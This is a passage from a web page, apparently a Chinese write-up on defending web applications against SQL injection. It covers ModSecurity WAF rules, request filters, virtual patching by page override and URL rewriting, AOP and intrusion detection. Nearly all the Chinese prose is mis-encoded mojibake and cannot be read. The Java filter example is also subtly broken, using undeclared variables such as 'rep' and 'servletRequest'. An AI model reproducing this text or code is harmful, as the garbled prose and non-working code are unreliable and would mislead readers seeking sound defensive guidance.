åˆ°Webåº”ç”¨çš„åŸºäºè½¯ä»¶çš„è§£å†³æ–¹æ¡ˆã€‚</p><p>åŸºäºè½¯ä»¶çš„WAFé€šå¸¸æ˜¯ä¸€äº›ä»¥æœ€å°åŒ–é…ç½®åµŒå…¥åˆ°WebæœåŠ¡å™¨æˆ–åº”ç”¨ç¨‹åºä¸­çš„æ¨¡å—ï¼Œå®ƒä»¬çš„ä¸»è¦å¥½å¤„æ˜¯WebåŸºç¡€ç»“æ„ä»ä¿æŒä¸å˜ï¼Œå¹¶ä¸”èƒ½å¤Ÿæ— ç¼åœ°å¤„ç†HTTP/HTTPSé€šä¿¡ï¼Œå› ä¸ºå®ƒä»¬è¿è¡Œåœ¨æ‰¿è½½Webæˆ–åº”ç”¨ç¨‹åºçš„è¿›ç¨‹ä¸­ã€‚</p><p>WAF çš„äº‹å®æ ‡å‡†æ˜¯å¼€æºçš„ <a href="http://www.modsecurity.org/">ModSecurity</a>.ModSecurityè¢«å¼€å‘æˆ Apacheçš„ä¸€ä¸ªæ¨¡å—ã€‚å¦‚æœå°†Apache WebæœåŠ¡å™¨é…ç½®æˆåå‘ä»£ç†ï¼Œé‚£ä¹ˆModSecurityå®é™…ä¸Šå¯ä»¥ä¿æŠ¤ä»»ä½•Webåº”ç”¨ï¼Œå¯ä»¥ä½¿ç”¨ModSecurityæ¥å®ç°æ”»å‡»é¢„é˜²ã€ç›‘æ§ã€å…¥ä¾µæ£€æµ‹å’Œä¸€èˆ¬çš„åº”ç”¨ç¨‹åºåŠ å›ºã€‚</p><p>æˆ‘ä»¬å°†ä½¿ç”¨ModSecurityä½œä¸ºä¸»è¦çš„ä¾‹å­æ¥ä»‹ç»ä½¿ç”¨WAFæ—¶åœ¨æ£€æµ‹å¹¶é¢„é˜²SQLæ³¨å…¥æ–¹é¢çš„ä¸»è¦ç‰¹å¾ã€‚</p><h5 id="å¯é…ç½®è§„åˆ™é›†"><a href="#å¯é…ç½®è§„åˆ™é›†" class="headerlink" title="å¯é…ç½®è§„åˆ™é›†"></a>å¯é…ç½®è§„åˆ™é›†</h5><p>WAFå¿…é¡»é«˜åº¦å¯é…ç½®æ‰èƒ½é€‚åº”å„ç§ä¸åŒçš„æƒ…å†µã€‚</p><p>ModSecurityçš„å¨åŠ›åœ¨äºå®ƒçš„è§„åˆ™è¯­è¨€ä¸Šï¼Œè¿™ç§è¯­è¨€æ˜¯é…ç½®æŒ‡ä»¤å’Œåº”ç”¨åˆ°HTTPè¯·æ±‚å’Œå“åº”çš„ä¸€ç§ç®€å•ç¼–ç¨‹è¯­è¨€çš„ç»„åˆã€‚ModSecurityçš„SecRule æŒ‡ä»¤çš„é€šç”¨è¯­æ³•ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><pre class="line-numbers language-SecRules" data-language="SecRules"><code class="language-SecRules">SecRule VARIABLE OPERATOR [ACTIONS]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>VARIABLEå±æ€§å‘Šè¯‰ModSecurityåˆ°å“ªé‡Œè®¿é—®è¯·æ±‚æˆ–å“åº”ï¼ŒOPERATORå±æ€§å‘Šè¯‰ModSecurityå¦‚ä½•æ£€æŸ¥æ•°æ®ï¼ŒACTIONSå±æ€§ç¡®å®šå‡ºç°åŒ¹é…æ—¶åšå“ªäº›æ“ä½œã€‚ACTIONSå±æ€§æ˜¯å¯é€‰çš„è§„åˆ™é€‰é¡¹ï¼Œ å®ƒå¯ä»¥å®šä¹‰é»˜è®¤çš„å…¨å±€åŠ¨ä½œã€‚</p><p>ModSecurityæ ¸å¿ƒè§„åˆ™é›†(ModSecurity Core Rule Set)çš„ Generic Attacks è§„åˆ™æ–‡ä»¶(modsecurity_crs_40_generic_attacks.conf)ä¸­çš„ä¸€æ¡å®é™…çš„é»‘åå•SQLæ³¨å…¥è§„åˆ™</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;Location /apps/script.php&gt;SecRule &amp;ARGS "!@eq 1"SecRule ARGS_NAMES "!Astatid$"SecRule ARGS:statID "!^\d{1,3}$"<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Location</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="è¯·æ±‚è¦†ç›–èŒƒå›´"><a href="#è¯·æ±‚è¦†ç›–èŒƒå›´" class="headerlink" title="è¯·æ±‚è¦†ç›–èŒƒå›´"></a>è¯·æ±‚è¦†ç›–èŒƒå›´</h5><p>æ”»å‡»æœ‰æ•ˆè½½è·å¯ä»¥å‡ºç°åœ¨HTTPè¯·æ±‚çš„ä»»ä½•ä½ç½®ï¼Œæ¯”å¦‚æŸ¥è¯¢å­—ç¬¦ä¸²ã€POSTæ•°æ®ã€cookieã€è‡ªå®šä¹‰çš„æˆ–æ˜¯æ ‡å‡†çš„HTTPå¤´(ä¾‹å¦‚,Referer, Serverç­‰)ï¼Œä»¥åŠURLè·¯å¾„çš„éƒ¨åˆ†å†…å®¹ä¸­ã€‚ModSecurityèƒ½å¤Ÿå¤„ç†æ‰€æœ‰è¿™äº›æƒ…å†µã€‚ä¸‹é¢åˆ—å‡ºäº† ModSecurityæ”¯æŒçš„å˜é‡åˆ—è¡¨</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">REQUEST BASENAMEREQUEST BODYREQUEST BODY LENGTHREQUEST COOKIESREQUEST COOKIES NAMESREQUEST FILENAMEREQUEST HEADERSREQUEST HEADERS NAMESREQUEST LINEREQUEST METHODREQUEST PROTOCOLREQUEST URIREQUEST URI RAW<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="è¯·æ±‚æ ‡å‡†åŒ–"><a href="#è¯·æ±‚æ ‡å‡†åŒ–" class="headerlink" title="è¯·æ±‚æ ‡å‡†åŒ–"></a>è¯·æ±‚æ ‡å‡†åŒ–</h5><p>ModSecurityèƒ½å¤Ÿåº”å¯¹ä»»ä½•å¤æ‚çš„ç¼–ç åœºæ™¯ã€‚å®ƒæ”¯æŒå¤§é‡è½¬æ¢å‡½æ•°ï¼Œå¯ä»¥å°†è¿™äº›å‡½æ•°æŒ‰ä»»æ„é¡ºåºå¤šæ¬¡åº”ç”¨åˆ°æ¯æ¡è§„åˆ™ä¸Šã€‚ä¸‹é¢åˆ—å‡ºäº† ModSecurityå‚è€ƒæ‰‹å†Œä¸­çš„è½¬æ¢å‡½æ•°</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">base64Decodebase64DecodeExtbase64EncodecmdLinecompressWhitespacecssDecodeescapeSeqDecodehexDecodehexEncodehtmlEntityDecodejsDecodelengthlowercasemd5nonenormalisePathnormalisePathwinparityEven7bitparityodd7bitparityzero7bitremoveNullsremoveWhitespacereplaceCommentsremoveCommentsCharremoveCommentsreplaceNullsurlDecodeurlDecodeUniurlEncodesha1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœå†…ç½®å‡½æ•°å› ä¸ºæŸä¸ªåŸå› æ— æ³•æ»¡è¶³éœ€æ±‚ï¼Œå¯ä»¥ä½¿ç”¨ModSecurityæ”¯æŒçš„Luaè„šæœ¬è¯­è¨€æ¥æ„å»ºè‡ªå®šä¹‰çš„è½¬æ¢å‡½æ•°ã€‚</p><h5 id="å“åº”åˆ†æ"><a href="#å“åº”åˆ†æ" class="headerlink" title="å“åº”åˆ†æ"></a>å“åº”åˆ†æ</h5><p>æŠ‘åˆ¶å…³é”®ä¿¡æ¯æ³„éœ²ï¼Œæ¯”å¦‚è¯¦ç»†çš„SQLé”™è¯¯æ¶ˆæ¯ã€‚</p><p>ModSecurityæ ¸å¿ƒè§„åˆ™é›†çš„Outboundè§„åˆ™æ–‡ä»¶(modsecurity_ crs_50_ outbound.conf)ä¸­çš„ä¸€æ¡å®é™…çš„å¸¦å¤–(outbound)è§„åˆ™</p><p>å¦‚æœå“åº”ä¸­çš„æ¶ˆæ¯æˆåŠŸåŒ¹é…äº†æ­£åˆ™è¡¨è¾¾å¼(è¡¨æ˜äº§ç”Ÿäº†SQLé”™è¯¯)ï¼ŒModSecurityå¯ä»¥åšå‡ºé€‚å½“çš„å“åº”ï¼Œæ¯”å¦‚ç¦æ­¢å°†é”™è¯¯è¿”å›ç»™æ”»å‡»è€…ï¼Œæˆ–è€…æä¾›æ›¿æ¢çš„é”™è¯¯ç¼–ç æˆ–é”™è¯¯æ¶ˆæ¯ä»¥è¿·æƒ‘è‡ªåŠ¨å®¢æˆ·ç«¯å’Œæ‰«æå™¨ã€‚</p><h5 id="å…¥ä¾µæ£€æµ‹èƒ½åŠ›"><a href="#å…¥ä¾µæ£€æµ‹èƒ½åŠ›" class="headerlink" title="å…¥ä¾µæ£€æµ‹èƒ½åŠ›"></a>å…¥ä¾µæ£€æµ‹èƒ½åŠ›</h5><p>WAFåº”è¯¥å¯ä»¥è¢«åŠ¨ç›‘è§†åº”ç”¨çš„è¡Œä¸ºï¼Œé‡åˆ°å¯ç–‘çš„è¡Œä¸ºæ—¶èƒ½é‡‡ç”¨è¡ŒåŠ¨ï¼Œå¹¶èƒ½åœ¨SQLæ³¨å…¥äº‹ä»¶ä¹‹åä¸ºå–è¯åˆ†æ(forensic analysis)ä¿æŒä¸€ä¸ªä¸å¯å¦è®¤çš„äº‹ä»¶æ—¥å¿—ã€‚</p><p>ä½¿ç”¨ModSecurityå¯ä»¥é˜»æ­¢SQLæ³¨å…¥æ”»å‡»ã€ä¿®å¤å·²çŸ¥çš„SQLæ³¨å…¥æ¼æ´ã€æ£€æµ‹æ”»å‡»ä¼å›¾å¹¶æŠ‘åˆ¶é‚£äº›é€šå¸¸ä¼šä¸ºSQLæ³¨å…¥æ¼æ´åˆ©ç”¨æä¾›ä¾¿åˆ©çš„SQLé”™è¯¯æ¶ˆæ¯ã€‚</p><h4 id="æˆªæ–­è¿‡æ»¤å™¨"><a href="#æˆªæ–­è¿‡æ»¤å™¨" class="headerlink" title="æˆªæ–­è¿‡æ»¤å™¨"></a>æˆªæ–­è¿‡æ»¤å™¨</h4><p>è¿‡æ»¤å™¨æ˜¯WAFçš„ç‹¬ç«‹æ¨¡å—ï¼Œå¯æ·»åŠ æ–°è¿‡æ»¤å™¨</p><p>è¿‡æ»¤å™¨é€‚åˆæ‰§è¡Œè·¨è¯·æ±‚å’Œå“åº”ï¼ˆä¸æ ¸å¿ƒåº”ç”¨é€»è¾‘æ˜¯æ¾è€¦åˆï¼‰çš„é›†ä¸­çš„ã€å¯é‡å¤çš„ä»»åŠ¡ã€‚è¿‡æ»¤å™¨è¿˜é€‚ç”¨äºè¾“å…¥éªŒè¯ã€å°†è¯·æ±‚/å“åº”è®°å½•åˆ°æ—¥å¿—ä»¥åŠè½¬æ¢è¾“å‡ºå“åº”ç­‰å®‰å…¨åŠŸèƒ½ã€‚</p><h5 id="WebæœåŠ¡å™¨è¿‡æ»¤å™¨"><a href="#WebæœåŠ¡å™¨è¿‡æ»¤å™¨" class="headerlink" title="WebæœåŠ¡å™¨è¿‡æ»¤å™¨"></a>WebæœåŠ¡å™¨è¿‡æ»¤å™¨</h5><p>å¯ä»¥å°†è¿‡æ»¤å™¨å®ç°æˆWebæœåŠ¡å™¨æ¨¡å—/æ’ä»¶ï¼Œå®ƒä»¬èƒ½å¯¹æ ¸å¿ƒè¯·æ±‚å’Œå“åº”è¿›è¡Œæ‰©å±•ä»¥ä¾¿å¤„ç† WebæœåŠ¡å™¨å¹³å°çš„APIã€‚Apacheã€ Netscapeï¼ˆOracle/Sunï¼‰ã€IISï¼ˆIntemetä¿¡æ¯æœåŠ¡ï¼‰ç­‰æµè¡Œçš„WebæœåŠ¡å™¨å¹³å°å‡æ”¯æŒè¿™ç§æ¶æ„ã€‚</p><p>ModSecurityæ˜¯ä¸€ç§èƒ½å¤Ÿæä¾›ç›¸å½“å¤šçš„SQLæ³¨å…¥ä¿æŠ¤çš„Apache APIæ¨¡å—ã€‚UrlScanå’ŒWebKnightï¼Œå®ƒä»¬æ˜¯é›†æˆåˆ°IIS WebæœåŠ¡å™¨å¹³å°çš„ISAPIè¿‡æ»¤å™¨ï¼Œèƒ½å¤Ÿæä¾›SQLæ³¨å…¥ä¿æŠ¤ã€‚</p><h5 id="åº”ç”¨ç¨‹åºè¿‡æ»¤å™¨"><a href="#åº”ç”¨ç¨‹åºè¿‡æ»¤å™¨" class="headerlink" title="åº”ç”¨ç¨‹åºè¿‡æ»¤å™¨"></a>åº”ç”¨ç¨‹åºè¿‡æ»¤å™¨</h5><p>ä¹Ÿå¯ä»¥ä½¿ç”¨Webåº”ç”¨çš„ç¼–ç¨‹è¯­è¨€æˆ–æ¡†æ¶æ¥å®ç°è¿‡æ»¤å™¨ã€‚å…¶æ¶æ„ä¸WebæœåŠ¡å™¨æ’ä»¶çš„æ¶æ„ç±»ä¼¼ï¼šæ¨¡å—ä»£ç åœ¨è¯·æ±‚å’Œå“åº”ç»å†ä¸€ç³»åˆ—é˜¶æ®µçš„è¿‡ç¨‹æ—¶æ‰§è¡Œã€‚å¯ä»¥ä½¿ç”¨ASP.NETçš„ System.Web.IHttpModuleå’Œjavax.servlet.Filteræ¥å£æ¥å®ç°è¿‡æ»¤å™¨æ¨¡å¼ï¼Œä¹‹åå¯ä»¥åœ¨ä¸ä¿®æ”¹ä»£ç çš„å‰æä¸‹å°†å®ƒä»¬æ·»åŠ åˆ°åº”ç”¨ä¸­å¹¶åœ¨åº”ç”¨ç¨‹åºçš„é…ç½®æ–‡ä»¶ä¸­æ˜¾å¼åœ°æ¿€æ´»å®ƒä»¬ã€‚</p><p>ä¸‹é¢åˆ—å‡ºäº†è‡ªå®šä¹‰çš„J2EE Filterç±»çš„doFilteræ–¹æ³•çš„ç¤ºä¾‹ä»£ç ã€‚æ¯ä¸ªè¯·æ±‚/å“åº”å¯¹ä¼šå› ä¸ºJ2EE Webæºï¼ˆJSPæ–‡ä»¶ã€servletç­‰ï¼‰çš„è¯·æ±‚è€Œè°ƒç”¨è¯¥æ–¹æ³•ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SqlInjDetectionFilter</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> res<span class="token punctuation">,</span>chain filterchain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">{</span><span class="token comment">//æ£€æŸ¥è¯·æ±‚æ•°æ®ï¼Œå¯»æ‰¾æ¶æ„å­—ç¬¦</span><span class="token function">doDetectSqlI</span><span class="token punctuation">(</span>rep<span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è°ƒç”¨é“¾ä¸­çš„ä¸‹ä¸€ä¸ªè¿‡æ»¤å™¨</span>chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span> servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åº”ç”¨ç¨‹åºè¿‡æ»¤å™¨ç¡®å®é€‚åˆäºè¿è¡Œæ—¶ï¼ˆruntimeï¼‰ä¿æŠ¤ï¼Œå¼€å‘æ—¶å®ƒä»¬å¯ä»¥ç‹¬ç«‹äºåº”ç”¨ç¨‹åºï¼Œéƒ¨ç½²æ—¶åˆ™å¯ä»¥ä½œä¸ºç‹¬ç«‹çš„.dllæˆ–.jaræ–‡ä»¶å¹¶ä¸”èƒ½ç«‹å³æ¿€æ´»ã€‚</p><h5 id="ä½¿ç”¨è„šæœ¬è¯­è¨€å®ç°è¿‡æ»¤å™¨æ¨¡å¼"><a href="#ä½¿ç”¨è„šæœ¬è¯­è¨€å®ç°è¿‡æ»¤å™¨æ¨¡å¼" class="headerlink" title="ä½¿ç”¨è„šæœ¬è¯­è¨€å®ç°è¿‡æ»¤å™¨æ¨¡å¼"></a>ä½¿ç”¨è„šæœ¬è¯­è¨€å®ç°è¿‡æ»¤å™¨æ¨¡å¼</h5><p>å°±PHP Webåº”ç”¨è€Œè¨€ï¼Œå¯ä»¥åœ¨php.iniæ–‡ä»¶ä¸­åˆ©ç”¨auto_prepend_fileå’Œauto_append_fileé…ç½®æŒ‡ä»¤ï¼Œè¿™äº›æŒ‡ä»¤æŒ‡å‘é‚£äº›åœ¨æ¯ä¸ªè¯·æ±‚çš„PHPè„šæœ¬æ‰§è¡Œä¹‹å‰å’Œä¹‹åæ‰æ‰§è¡Œçš„PHPæ–‡ä»¶ã€‚æ·»åŠ çš„é€»è¾‘åœ¨å„ç§HTTPè¯·æ±‚é›†åˆï¼ˆæŸ¥è¯¢å­—ç¬¦ä¸²ã€POSTã€cookieã€å¤´ç­‰ï¼‰é—´å¾ªç¯ï¼Œå¿…è¦æ—¶å¯ä»¥è¿›è¡ŒéªŒè¯å’Œæˆ–æ—¥å¿—è®°å½•ã€‚</p><p>å¦ä¸€ç§ç”¨äºPHPå’Œç»å…¸ASPåº”ç”¨çš„æ–¹æ³•æ˜¯ä½¿ç”¨åŒ…å«æ–‡ä»¶ï¼ˆinclude fileï¼‰ã€‚è¿™éœ€è¦é€šè¿‡åœ¨æ¯ä¸ªåº”ç”¨ç¨‹åºé¡µé¢æ·»åŠ includeæŒ‡ä»¤æ¥ä¿®æ”¹ä»£ç ã€‚åŒæ ·ï¼Œè¢«åŒ…å«çš„é€»è¾‘ä¹Ÿåœ¨å„ç§HTTPè¯·æ±‚é›†åˆé—´å¾ªç¯ï¼Œå¿…è¦æ—¶ä¹Ÿå¯ä»¥è¿›è¡ŒéªŒè¯å’Œæˆ–æ—¥å¿—è®°å½•ã€‚</p><h5 id="è¿‡æ»¤WebæœåŠ¡æ¶ˆæ¯"><a href="#è¿‡æ»¤WebæœåŠ¡æ¶ˆæ¯" class="headerlink" title="è¿‡æ»¤WebæœåŠ¡æ¶ˆæ¯"></a>è¿‡æ»¤WebæœåŠ¡æ¶ˆæ¯</h5><p>ä½¿ç”¨è‡ªå®šä¹‰çš„è¾“å…¥å’Œè¾“å‡ºè¿‡æ»¤å™¨åŒæ ·å¯ä»¥å¾ˆå®¹æ˜“åœ°å°†æˆªæ–­è¿‡æ»¤å™¨æ¨¡å¼åº”ç”¨äºXML WebæœåŠ¡ã€‚</p><h4 id="ä¸å¯ç¼–è¾‘ä¸å¯ç¼–è¾‘çš„è¾“å…¥ä¿æŠ¤"><a href="#ä¸å¯ç¼–è¾‘ä¸å¯ç¼–è¾‘çš„è¾“å…¥ä¿æŠ¤" class="headerlink" title="ä¸å¯ç¼–è¾‘ä¸å¯ç¼–è¾‘çš„è¾“å…¥ä¿æŠ¤"></a>ä¸å¯ç¼–è¾‘ä¸å¯ç¼–è¾‘çš„è¾“å…¥ä¿æŠ¤</h4><p>è¾“å…¥éªŒè¯ç­–ç•¥ï¼Œå°†åº”ç”¨ç¨‹åºçš„è¾“å…¥åˆ†æˆå¯ç¼–è¾‘çš„å’Œä¸å¯ç¼–è¾‘çš„ä¸¤ç±»ï¼Œå¹¶ä¸”é”å®šä¸å¯ç¼–è¾‘çš„è¾“å…¥ä»¥ä¾¿æ— æ³•æ“ä½œå®ƒä»¬ã€‚ä¸å¯ç¼–è¾‘è¾“å…¥æ˜¯æŒ‡æœ€ç»ˆç”¨æˆ·ä¸éœ€è¦ç›´æ¥ä¿®æ”¹çš„è¾“å…¥ï¼Œæ¯”å¦‚éšè—è¡¨å•å­—æ®µã€URIå’ŒæŸ¥è¯¢å­—ç¬¦ä¸²å‚æ•°ã€cookieç­‰ã€‚è¯¥ç­–ç•¥éšå«çš„åŸç†æ˜¯ï¼šåº”ç”¨ç¨‹åºåº”è¯¥åªå…è®¸ç”¨æˆ·æ‰§è¡Œç”¨æˆ·æ¥å£æš´éœ²ç»™ä»–ä»¬çš„åŠ¨ä½œã€‚</p><p>å®ç°è¿™ç§ç­–ç•¥çš„æŠ€æœ¯èŒƒä¾‹æ˜¯HDIV(HTTP Data Integrity Validator, HTTPæ•°æ®å®Œæ•´æ€§éªŒè¯å™¨) å’ŒSPFã€‚</p><h4 id="URLç­–ç•¥ä¸é¡µé¢å±‚ç­–ç•¥"><a href="#URLç­–ç•¥ä¸é¡µé¢å±‚ç­–ç•¥" class="headerlink" title="URLç­–ç•¥ä¸é¡µé¢å±‚ç­–ç•¥"></a>URLç­–ç•¥ä¸é¡µé¢å±‚ç­–ç•¥</h4><p>ä¸ä¿®æ”¹æºä»£ç çš„å‰æä¸‹ï¼Œä¸ºæ˜“å—æ”»å‡»çš„URLæˆ–é¡µé¢æ‰“è™šæ‹Ÿè¡¥ä¸çš„æŠ€æœ¯ã€‚</p><h5 id="é¡µé¢è¦†å†™-override"><a href="#é¡µé¢è¦†å†™-override" class="headerlink" title="é¡µé¢è¦†å†™(override)"></a>é¡µé¢è¦†å†™(override)</h5><p>å¦‚æœé¡µé¢æ˜“å—æ”»å‡»ä¸”éœ€è¦æ›¿æ¢ï¼Œé‚£ä¹ˆå¯ä»¥åˆ›å»ºä¸€ä¸ªåœ¨è¿è¡Œæ—¶æäº¤çš„æ›¿ä»£é¡µé¢æˆ–ç±»ï¼Œé€šè¿‡ä¿®æ”¹Webåº”ç”¨é…ç½®æ–‡ä»¶ä¸­çš„é…ç½®å¯ä»¥å®ç°è¿™ç§æ›¿æ¢ã€‚åœ¨ASP.NETåº”ç”¨ä¸­ï¼Œåˆ™å¯ä»¥ä½¿ç”¨HTTP handler (å¤„ç†ç¨‹åº)å®ç°è¿™ä¸€ä»»åŠ¡ã€‚</p><p>ä¸‹é¢å±•ç¤ºäº†ä¸€è‡ªå®šä¹‰HTTP handlerçš„é…ç½®ï¼Œå®ƒç”¨äºå¤„ç†å‘é€ç»™PageVulnToSqll.aspxé¡µé¢è€Œéæ˜“å—æ”»å‡»é¡µé¢çš„è¯·æ±‚ã€‚</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>httpHandlers</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>add</span> <span class="token attr-name">verb</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>*<span class="token punctuation">"</span></span><span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PageVulnToSqlI.aspx<span class="token punctuation">"</span></span><span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Chapter9.Examples.SecureAspxHandler, Subclass<span class="token punctuation">"</span></span><span class="token attr-name">validate</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>httpHandlers</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å°†æ˜“å—æ”»å‡»çš„URLæ˜ å°„åˆ°ä¸€ä¸ªé€šè¿‡å®‰å…¨æ–¹å¼å¤„ç†è¯·æ±‚çš„servletä¸Š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>SecureServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">&gt;</span></span>chapter9.examples.SecureServletClass<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servletclass</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--&lt;servlet-name&gt;ServletVulnToSqli&lt;/servlet-name&gt;--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>SecureServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">&gt;</span></span>/ServletVulnToSqli<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="URLé‡å†™"><a href="#URLé‡å†™" class="headerlink" title="URLé‡å†™"></a>URLé‡å†™</h5><p>URLé‡å†™(rewrite)æ˜¯ä¸€ç§ä¸é¡µé¢è¦†å†™(override)ç±»ä¼¼çš„æŠ€æœ¯ã€‚å¯ä»¥é€šè¿‡é…ç½®WebæœåŠ¡å™¨æˆ–åº”ç”¨æ¡†æ¶æ¥æ¥æ”¶é‚£äº›å‘é€ç»™æ˜“å—æ”»å‡»é¡µé¢æˆ–URLçš„è¯·æ±‚ï¼Œå¹¶å°†å®ƒä»¬é‡å®šå‘åˆ°è¯¥é¡µé¢çš„æ›¿ä»£ç‰ˆæœ¬ã€‚ é¡µé¢çš„æ–°ç‰ˆæœ¬é€šè¿‡ä¸€ç§å®‰å…¨çš„æ–¹å¼æ¥å®ç°åŸå§‹é¡µé¢é€»è¾‘ã€‚</p><h5 id="èµ„æºä»£ç†ä¸å°è£…"><a href="#èµ„æºä»£ç†ä¸å°è£…" class="headerlink" title="èµ„æºä»£ç†ä¸å°è£…"></a>èµ„æºä»£ç†ä¸å°è£…</h5><p>å¯ä»¥å°†èµ„æºä»£ç†ä¸å°è£…å’Œé¡µé¢è¦†å†™æˆ–URLé‡å†™ç»“åˆä½¿ç”¨ï¼Œä»¥ä¾¿å°†æ›¿æ¢é¡µé¢éœ€è¦çš„è‡ªå®šä¹‰ç¼–ç æ•°é‡é™è‡³æœ€ä½ã€‚æ›¿ä»£é¡µé¢åœ¨å¤„ç†é‡å†™è¯·æ±‚æ—¶ä¼šå¾ªç¯è®¿é—®è¯·æ±‚å‚æ•°(æŸ¥è¯¢å­—ç¬¦ä¸²ã€POSTã€ cookieç­‰)å¹¶æ‰§è¡Œå¿…éœ€çš„éªŒè¯ã€‚</p><h4 id="é¢å‘æ–¹é¢ç¼–ç¨‹"><a href="#é¢å‘æ–¹é¢ç¼–ç¨‹" class="headerlink" title="é¢å‘æ–¹é¢ç¼–ç¨‹"></a>é¢å‘æ–¹é¢ç¼–ç¨‹</h4><p>é¢å‘æ–¹é¢ç¼–ç¨‹(Aspect-Oriented Programming, AOP)æ˜¯ä¸€ç§æ„å»ºå¯åº”ç”¨åˆ°åº”ç”¨ç¨‹åºèŒƒå›´å†…çš„é€šç”¨å¯é‡ç”¨ä¾‹ç¨‹çš„æŠ€æœ¯ã€‚åœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œå®ƒæœ‰åˆ©äºæ ¸å¿ƒåº”ç”¨ç¨‹åºé€»è¾‘å’Œé€šç”¨ã€é‡å¤ä»»åŠ¡(è¾“å…¥ éªŒè¯ã€è®°å½•æ—¥å¿—ã€é”™è¯¯å¤„ç†ç­‰)çš„åˆ†ç¦»ã€‚è¿è¡Œæ—¶ï¼Œå¯ä»¥ä½¿ç”¨AOPæ¥çƒ­è¡¥(hot-patch)æ˜“å—SQLæ³¨å…¥æ”»å‡»çš„åº”ç”¨ç¨‹åºï¼Œä¹Ÿå¯ä»¥æ— é¡»ä¿®æ”¹åº•å±‚æºä»£ç å°±ç›´æ¥å°†å…¥ä¾µæ£€æµ‹å’Œæ—¥å¿—å®¡æŸ¥åŠŸèƒ½åµŒå…¥åˆ°åº”ç”¨ç¨‹åºä¸­ã€‚</p><h4 id="åº”ç”¨ç¨‹åºå…¥ä¾µæ£€æµ‹ç³»ç»Ÿ"><a href="#åº”ç”¨ç¨‹åºå…¥ä¾µæ£€æµ‹ç³»ç»Ÿ" class="headerlink" title="åº”ç”¨ç¨‹åºå…¥ä¾µæ£€æµ‹ç³»ç»Ÿ"></a>åº”ç”¨ç¨‹åºå…¥ä¾µæ£€æµ‹ç³»ç»Ÿ</h4><p>å¯ä»¥ä½¿ç”¨ä¼ ç»Ÿçš„åŸºäºç½‘ç»œçš„å…¥ä¾µæ£€æµ‹ç³»ç»Ÿ(Intrusion Detection Systems, 